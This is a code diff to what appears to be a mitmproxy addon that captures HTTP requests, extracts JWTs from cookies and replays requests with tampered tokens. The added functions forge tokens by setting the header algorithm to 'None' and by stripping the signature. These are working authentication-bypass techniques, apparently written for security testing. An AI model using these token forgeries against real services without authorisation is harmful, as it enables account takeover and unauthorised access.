@@ -22,7 +22,7 @@ def clone_request(flow: http.HTTPFlow):
 def get_jwt(cookies: dict):
     token = None
     for cookie in cookies.values():
-        token = re.search(r'[\w\-_]+\.[\w\-_]+\.[\w\-_]+', cookie)
+        token = re.search(r'eyJ[\w\-_]+\.eyJ[\w\-_]+\.[\w\-_]*', cookie)
         if token is not None:
             break
     if token is None:
@@ -30,23 +30,26 @@ def get_jwt(cookies: dict):
     else:
         return token.group(0)
 
-# generates a faulty JWT token from a valid one
-def generate_faulty_token(token: str):
-    return token
-    return token + 'a'
+# generates a none alg JWT token from a valid one (keeping the same payload and signature)
+def generate_none_token_with_signature(token: str):
     header, payload, signature = token.split('.')
-    payload_decoded = base64.b64decode(payload + '=' * (-len(payload) % 4))
-    parsed_payload = json.loads(payload_decoded)
-    parsed_payload['dummy'] = 'dummy'
-    payload_encoded = base64.b64encode(json.dumps(parsed_payload).encode()).decode().replace('=', '')
-    return header + '.' + payload_encoded + '.' + signature
+    header_decoded = base64.b64decode(header + '=' * (-len(header) % 4))
+    parsed_header = json.loads(header_decoded)
+    parsed_header['alg'] = 'None'
+    header_encoded = base64.b64encode(json.dumps(parsed_header).encode()).decode().replace('=', '')
+    return header_encoded + '.' + payload + '.' + signature
+
+# drops the signature from a JWT token
+def drop_token_signature(token: str):
+    header, payload, signature = token.split('.')
+    return header + '.' + payload + '.'
 
 # replays the request after checking it is not a replay (to avoid an infinite loop)
 def replay_flow(flow: http.HTTPFlow):
     
     flow.request.ignore = True  # marks the request as a replay request
         
-    print(f'Replaying request: {flow.request}')
+    # print(f'><> Replaying request: {flow.request}')
 
     # replays the specified flow (request cycle)
     playback_action = ctx.master.addons.get('clientplayback')
